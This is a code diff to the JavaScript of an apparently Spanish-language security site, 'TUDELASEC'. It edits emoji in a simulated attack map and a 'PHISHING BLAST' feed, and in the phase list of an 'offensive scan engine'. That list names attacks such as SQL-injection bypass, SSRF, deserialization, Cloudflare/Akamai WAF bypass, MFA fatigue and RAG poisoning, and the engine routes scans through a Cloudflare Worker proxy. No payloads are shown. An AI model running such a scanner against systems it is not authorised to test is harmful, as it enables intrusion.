+ {n:'Washington', cc:'🇺🇸',la:38.9, lo:-77.0, w:3},
+ {n:'Toronto',    cc:'🇨🇦',la:43.7, lo:-79.4, w:3},
+ {n:'Mexico City',cc:'🇲🇽',la:19.4, lo:-99.1, w:3},
+ {n:'S\u00E3o Paulo',  cc:'🇧🇷',la:-23.5,lo:-46.6, w:4},
+ {n:'Buenos Aires',cc:'🇦🇷',la:-34.6,lo:-58.4,w:3},
+ {n:'Bogot\u00E1',     cc:'🇨🇴',la:4.7,  lo:-74.1, w:2},
+ {n:'Santiago',   cc:'🇨🇱',la:-33.4,lo:-70.6, w:2},
+ {n:'London',     cc:'🇬🇧',la:51.5, lo:-0.1,  w:5},
+ {n:'Paris',      cc:'🇫🇷',la:48.8, lo:2.3,   w:4},
+ {n:'Berlin',     cc:'🇩🇪',la:52.5, lo:13.4,  w:3},
+ {n:'Moscow',     cc:'🇷🇺',la:55.7, lo:37.6,  w:5},
+ {n:'Madrid',     cc:'🇪🇸',la:40.4, lo:-3.7,  w:3},
+ {n:'Rome',       cc:'🇮🇹',la:41.9, lo:12.5,  w:3},
+ {n:'Kyiv',       cc:'🇺🇦',la:50.4, lo:30.5,  w:2},
+ {n:'Istanbul',   cc:'🇹🇷',la:41.0, lo:29.0,  w:3},
+ {n:'Beijing',    cc:'🇨🇳',la:39.9, lo:116.4, w:5},
+ {n:'Shanghai',   cc:'🇨🇳',la:31.2, lo:121.5, w:5},
+ {n:'Tokyo',      cc:'🇯🇵',la:35.6, lo:139.7, w:5},
+ {n:'Seoul',      cc:'🇰🇷',la:37.6, lo:126.9, w:4},
+ {n:'Mumbai',     cc:'🇮🇳',la:19.0, lo:72.8,  w:4},
+ {n:'Delhi',      cc:'🇮🇳',la:28.6, lo:77.2,  w:4},
+ {n:'Singapore',  cc:'🇸🇬',la:1.3,  lo:103.8, w:4},
+ {n:'Hong Kong',  cc:'🇭🇰',la:22.3, lo:114.2, w:4},
+ {n:'Bangkok',    cc:'🇹🇭',la:13.7, lo:100.5, w:3},
+ {n:'Jakarta',    cc:'🇮🇩',la:-6.2, lo:106.8, w:3},
+ {n:'Pyongyang',  cc:'🇰🇵',la:39.0, lo:125.8, w:3},
+ {n:'Tehran',     cc:'🇮🇷',la:35.7, lo:51.4,  w:3},
+ {n:'Dubai',      cc:'🇦🇪',la:25.2, lo:55.3,  w:3},
+ {n:'Cairo',      cc:'🇪🇬',la:30.0, lo:31.2,  w:3},
+ {n:'Lagos',      cc:'🇳🇬',la:6.5,  lo:3.4,   w:3},
+ {n:'Sydney',     cc:'🇦🇺',la:-33.8,lo:151.2, w:3},
+ {n:'Nairobi',    cc:'🇰🇪',la:-1.3, lo:36.8,  w:2},
 ];
 
 /* \u2550\u2550 MAPA OFFSCREEN \u2550\u2550 */
@@ -9815,7 +9815,7 @@ function phish(){
  }
  }
  upStats();
- addFeed('\u1F310','PHISHING BLAST','\u1F30D','ALL TARGETS','phishing','Phishing');
+ addFeed('🌐','PHISHING BLAST','🌍','ALL TARGETS','phishing','Phishing');
 }
 
 function upStats(){
@@ -9831,7 +9831,7 @@ function upStats(){
  });
  var se=document.getElementById('tm-sources');
  if(se&&st.tot>5){
- var top=[{n:'China',cc:'\u1F1E8\u1F1F3',p:28},{n:'USA',cc:'\u1F1FA\u1F1F8',p:22},{n:'Russia',cc:'\u1F1F7\u1F1FA',p:18},{n:'Brazil',cc:'\u1F1E7\u1F1F7',p:9},{n:'N.Korea',cc:'\u1F1F0\u1F1F5',p:7}];
+ var top=[{n:'China',cc:'🇨🇳',p:28},{n:'USA',cc:'🇺🇸',p:22},{n:'Russia',cc:'🇷🇺',p:18},{n:'Brazil',cc:'🇧🇷',p:9},{n:'N.Korea',cc:'🇰🇵',p:7}];
  se.innerHTML=top.map(function(t){return'<div class="tm-top-row"><span class="tm-top-flag">'+t.cc+'</span><span>'+t.n+'</span><span style="display:inline-block;height:3px;width:'+(t.p*1.8)+'px;background:rgba(255,26,46,.4);border-radius:1px;margin:0 6px;vertical-align:middle"></span><span style="font-family:var(--mono);font-size:10px;color:rgba(240,238,248,.4)">'+t.p+'%</span></div>';}).join('');
  }
 }
@@ -10975,133 +10975,8 @@ renderFilters();renderPayloads();
 termBody.innerHTML=ln("root@offsec-lab:~# ","dim")+ln("// Terminal lista. Elegi una ventana y un payload.","dim")+ln('<span class="lab-cursor"></span>',"dim");
 })();
 
-/* \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
- TUDELASEC \u2014 WEB SCANNER ENGINE v3.0
- 17 Fases | Cloudflare Worker Proxy | M\u00E1xima agresividad
- Proxy: https://scanner-proxy.matias-ramireztu.workers.dev
-\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 */
-(function(){
-'use strict';
-
-/* \u2500\u2500 ELEMENTOS UI \u2500\u2500 */
-var inp      = document.getElementById('scan-input');
-var btn      = document.getElementById('scan-btn');
-var phasesEl = document.getElementById('scan-phases');
-var progFill = document.getElementById('scan-progress-fill');
-var progPhase= document.getElementById('scan-progress-phase');
-var progPct  = document.getElementById('scan-progress-pct');
-var termBody = document.getElementById('scan-term-body');
-var statCrit = document.getElementById('stat-crit');
-var statHigh = document.getElementById('stat-high');
-var statMed  = document.getElementById('stat-med');
-var statLow  = document.getElementById('stat-low');
-var findings = document.getElementById('scan-findings');
-var modeBadge= document.getElementById('scan-mode-badge');
-if(!inp||!btn) return;
-
-/* \u2500\u2500 PROXY CLOUDFLARE WORKER \u2500\u2500 */
-var PROXY = 'https://scanner-proxy.matias-ramireztu.workers.dev';
-var PROXY_OK = false;
-
-/* Badge de advertencia fijo */
-(function(){
-  PROXY_OK = true;
-  /* Badge ya tiene el texto de advertencia desde el HTML */
-})();
-
-/* Helper: fetch directo con fallback a proxy */
-async function smartFetch(url, opts){
- try {
- var res = await pFetchOld(url, opts);
- PROXY_OK = true;
- return res;
- } catch(e) {
- /* Fallback: intento directo (puede fallar por CORS) */
- return await fetch(url, opts);
- }
-}
-
-/* \u2500\u2500 TERMINAL \u2500\u2500 */
-var logs = [];
-function log(txt, cls){
- cls = cls || 'white';
- var d = document.createElement('div');
- d.className = 'scan-ln ' + cls;
- d.innerHTML = txt;
- termBody.appendChild(d);
- termBody.scrollTop = termBody.scrollHeight;
- logs.push({txt:txt,cls:cls});
-}
-function logSep(label){
- log('', 'dim');
- log('\u250C\u2500 ' + label + ' ' + '\u2500'.repeat(Math.max(2, 42-label.length)) , 'section');
-}
-function logOk(msg) { log('  \u2713 ' + msg, 'ok'); }
-function logWarn(msg){ log('  \u26A0 ' + msg, 'amber'); }
-function logErr(msg) { log('  \u2717 ' + msg, 'red'); }
-function logInfo(msg){ log('  \u00B7 ' + msg, 'dim'); }
-function logFind(sev, msg){ log('  ['+sev+'] ' + msg, sev.toLowerCase()); }
-
-/* \u2500\u2500 FINDINGS \u2500\u2500 */
-var counts = {crit:0, high:0, med:0, low:0};
-var allFindings = [];
-
-function addFinding(sev, name, detail){
- sev = sev.toLowerCase();
- if(sev==='critical') sev='crit';
- counts[sev] = (counts[sev]||0) + 1;
- allFindings.push({sev:sev, name:name, detail:detail||'', ts:new Date()});
-
- /* Actualizar stats con animaci\u00F3n */
- var statEls = {crit:statCrit, high:statHigh, med:statMed, low:statLow};
- var statEl = statEls[sev];
- if(statEl){
- var parent = statEl.closest ? statEl.closest('.scan-stat') : null;
- statEl.textContent = counts[sev];
- if(parent){ parent.classList.remove('zero'); parent.style.animation='none'; setTimeout(function(){parent.style.animation='';},10); }
- }
- if(statCrit) statCrit.textContent = counts.crit;
- if(statHigh) statHigh.textContent = counts.high;
- if(statMed)  statMed.textContent  = counts.med;
- if(statLow)  statLow.textContent  = counts.low;
-
- if(!findings) return;
-
- /* Quitar el empty state */
- var empty = document.getElementById('scan-findings-empty');
- if(empty) empty.style.display='none';
-
- /* Mostrar bot\u00F3n PDF */
- var pdfBtn = document.getElementById('scan-pdf-btn');
- if(pdfBtn) pdfBtn.style.display='inline-flex';
-
- /* Crear tarjeta de hallazgo en tiempo real */
- var sevLabels={crit:'CRITICAL',high:'HIGH',med:'MEDIUM',low:'LOW'};
- var ts = new Date();
- var timeStr = ('0'+ts.getHours()).slice(-2)+':'+('0'+ts.getMinutes()).slice(-2)+':'+('0'+ts.getSeconds()).slice(-2);
- var card = document.createElement('div');
- card.className = 'sf-card '+sev;
- card.innerHTML =
- '<div class="sf-top">'
- +'<span class="sf-badge '+sev+'">'+(sevLabels[sev]||sev.toUpperCase())+'</span>'
- +'<span class="sf-name">'+escHtml(name)+'</span>'
- +'</div>'
- +(detail?'<div class="sf-detail">'+escHtml(detail.slice(0,90))+'</div>':'')
- +'<div class="sf-time">'+timeStr+'</div>';
- /* Cr\u00EDticos y altos van arriba */
- if(sev==='crit'||sev==='high'){
- findings.insertBefore(card, findings.firstChild);
- } else {
- findings.appendChild(card);
- }
- /* Auto-scroll al \u00FAltimo */
- findings.scrollTop = (sev==='crit'||sev==='high') ? 0 : findings.scrollHeight;
-}
-function escHtml(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-
-
-})();
-
+/* ==== Todo el motor del escáner queda encapsulado en un unico listener ==== */
+document.addEventListener('DOMContentLoaded', function(){
 /* \u2550\u2550 TUDELASEC OFFENSIVE SCAN ENGINE \u2014 MODO LEVIATAN v6.0 \u2550\u2550 */
 /* 130 FASES | Cloudflare Worker Proxy */
 var CF_PROXY='https://scanner-proxy.matias-ramireztu.workers.dev';
@@ -11173,23 +11048,23 @@ var PHASES=[
 {id:'p121',i:'\uD83D\uDD17',n:'Correlate'},{id:'p122',i:'\u2705',n:'PoCver'},{id:'p123',i:'\u2699\uFE0F',n:'Workers'},
 {id:'p124',i:'\uD83D\uDD04',n:'ProxyRot'},{id:'p125',i:'\uD83C\uDF0D',n:'Distrib'},{id:'p126',i:'\uD83D\uDCC8',n:'Increm'},
 {id:'p127',i:'\uD83D\uDCF7',n:'Evidence'},{id:'p128',i:'\uD83D\uDCCB',n:'Complnc'},{id:'p129',i:'\uD83D\uDD04',n:'Retest'},
-{id:'p130',i:'\u1F5C4\uFE0F',n:'SQLi2nd'},{id:'p131',i:'\u1F525',n:'SQLiByp'},{id:'p132',i:'\u1F9EC',n:'mXSS'},
-{id:'p133',i:'\u1F527',n:'SWXSS'},{id:'p134',i:'\u1F4E1',n:'SSRFScan'},{id:'p135',i:'\u1F5C4\uFE0F',n:'SSRFRed'},
-{id:'p136',i:'\u2601\uFE0F',n:'SSRFChn'},{id:'p137',i:'\u23F1\uFE0F',n:'TOCTOU'},{id:'p138',i:'\u1F40E',n:'DBRace'},
-{id:'p139',i:'\u2615',n:'JavaDes'},{id:'p140',i:'\u1F537',n:'NetDes'},{id:'p141',i:'\u1F418',n:'PHPDes'},
-{id:'p142',i:'\u1F40D',n:'PyPickle'},{id:'p143',i:'\u1F4E6',n:'GQLBat'},{id:'p144',i:'\u1F573\uFE0F',n:'GQLDepth'},
-{id:'p145',i:'\u1F50C',n:'WSAuth'},{id:'p146',i:'\u1FAA3',n:'S3Take'},{id:'p147',i:'\u1F511',n:'IAMPriv'},
-{id:'p148',i:'\u03BB',n:'Lambda'},{id:'p149',i:'\u1F6AA',n:'APIGW'},{id:'p150',i:'\u1F9E0',n:'PromptCh'},
-{id:'p151',i:'\u1F9EA',n:'RAGPois'},{id:'p152',i:'\u1F4E4',n:'ModelExt'},{id:'p153',i:'\u1F510',n:'DNSSEC'},
-{id:'p154',i:'\u1F3DA\uFE0F',n:'SubTakeD'},{id:'p155',i:'\u1F3AD',n:'CacheDec'},{id:'p156',i:'\u1F310',n:'CDNByp'},
-{id:'p157',i:'\u1F511',n:'ResetATO'},{id:'p158',i:'\u1F629',n:'MFAFatig'},{id:'p159',i:'\u1F4CE',n:'SessFixD'},
-{id:'p160',i:'3\uFE0F\u20E3',n:'HTTP3'},{id:'p161',i:'\u1F4F9',n:'WebRTC'},{id:'p162',i:'\u1F527',n:'SWExploit'},
-{id:'p163',i:'\u1F4E8',n:'PostMsgC'},{id:'p164',i:'\u1F310',n:'CORSExp'},{id:'p165',i:'\u1F3B2',n:'CTConf'},
-{id:'p166',i:'\u1F421',n:'MIMESnf'},{id:'p167',i:'\u1F4C1',n:'WebDAVD'},{id:'p168',i:'\u1F33F',n:'GitDeep'},
-{id:'p169',i:'\u1F4CB',n:'SVNDeep'},{id:'p170',i:'\u1F9AB',n:'HgDeep'},{id:'p171',i:'\u2601\uFE0F',n:'CFByp'},
-{id:'p172',i:'\u1F6E1\uFE0F',n:'AkamaiBP'},{id:'p173',i:'\u1F9F1',n:'ModSecBP'},{id:'p174',i:'\u1F50D',n:'JA3FP'},
-{id:'p175',i:'\u1F4DC',n:'CTLog'},{id:'p176',i:'\u1F570\uFE0F',n:'Wayback'},{id:'p177',i:'\u1F4E1',n:'Shodan'},
-{id:'p178',i:'\u1F3AF',n:'CVEMatch'},{id:'p179',i:'\u1F4A3',n:'0dayHunt'},{id:'p180',i:'\u1F480',n:'Reporte'}
+{id:'p130',i:'🗄\uFE0F',n:'SQLi2nd'},{id:'p131',i:'🔥',n:'SQLiByp'},{id:'p132',i:'🧬',n:'mXSS'},
+{id:'p133',i:'🔧',n:'SWXSS'},{id:'p134',i:'📡',n:'SSRFScan'},{id:'p135',i:'🗄\uFE0F',n:'SSRFRed'},
+{id:'p136',i:'\u2601\uFE0F',n:'SSRFChn'},{id:'p137',i:'\u23F1\uFE0F',n:'TOCTOU'},{id:'p138',i:'🐎',n:'DBRace'},
+{id:'p139',i:'\u2615',n:'JavaDes'},{id:'p140',i:'🔷',n:'NetDes'},{id:'p141',i:'🐘',n:'PHPDes'},
+{id:'p142',i:'🐍',n:'PyPickle'},{id:'p143',i:'📦',n:'GQLBat'},{id:'p144',i:'🕳\uFE0F',n:'GQLDepth'},
+{id:'p145',i:'🔌',n:'WSAuth'},{id:'p146',i:'🪣',n:'S3Take'},{id:'p147',i:'🔑',n:'IAMPriv'},
+{id:'p148',i:'\u03BB',n:'Lambda'},{id:'p149',i:'🚪',n:'APIGW'},{id:'p150',i:'🧠',n:'PromptCh'},
+{id:'p151',i:'🧪',n:'RAGPois'},{id:'p152',i:'📤',n:'ModelExt'},{id:'p153',i:'🔐',n:'DNSSEC'},
+{id:'p154',i:'🏚\uFE0F',n:'SubTakeD'},{id:'p155',i:'🎭',n:'CacheDec'},{id:'p156',i:'🌐',n:'CDNByp'},
+{id:'p157',i:'🔑',n:'ResetATO'},{id:'p158',i:'😩',n:'MFAFatig'},{id:'p159',i:'📎',n:'SessFixD'},
+{id:'p160',i:'3\uFE0F\u20E3',n:'HTTP3'},{id:'p161',i:'📹',n:'WebRTC'},{id:'p162',i:'🔧',n:'SWExploit'},
+{id:'p163',i:'📨',n:'PostMsgC'},{id:'p164',i:'🌐',n:'CORSExp'},{id:'p165',i:'🎲',n:'CTConf'},
+{id:'p166',i:'🐡',n:'MIMESnf'},{id:'p167',i:'📁',n:'WebDAVD'},{id:'p168',i:'🌿',n:'GitDeep'},
+{id:'p169',i:'📋',n:'SVNDeep'},{id:'p170',i:'🦫',n:'HgDeep'},{id:'p171',i:'\u2601\uFE0F',n:'CFByp'},
+{id:'p172',i:'🛡\uFE0F',n:'AkamaiBP'},{id:'p173',i:'🧱',n:'ModSecBP'},{id:'p174',i:'🔍',n:'JA3FP'},
+{id:'p175',i:'📜',n:'CTLog'},{id:'p176',i:'🕰\uFE0F',n:'Wayback'},{id:'p177',i:'📡',n:'Shodan'},
+{id:'p178',i:'🎯',n:'CVEMatch'},{id:'p179',i:'💣',n:'0dayHunt'},{id:'p180',i:'💀',n:'Reporte'}
 ];
 var totalP=PHASES.length;
 function buildP(){phasesEl.innerHTML='';PHASES.forEach(function(p){var d=document.createElement('div');d.className='scan-phase';d.id='sph-'+p.id;d.innerHTML='<div class="scan-phase-icon">'+p.i+'</div><div class="scan-phase-name">'+p.n+'</div>';phasesEl.appendChild(d);});}
@@ -11862,6 +11737,8 @@ if(pdfBtn)pdfBtn.addEventListener('click', function(){
  setTimeout(function(){win.print();},600);
 });
 })();
+
+});
 </script>
 
 
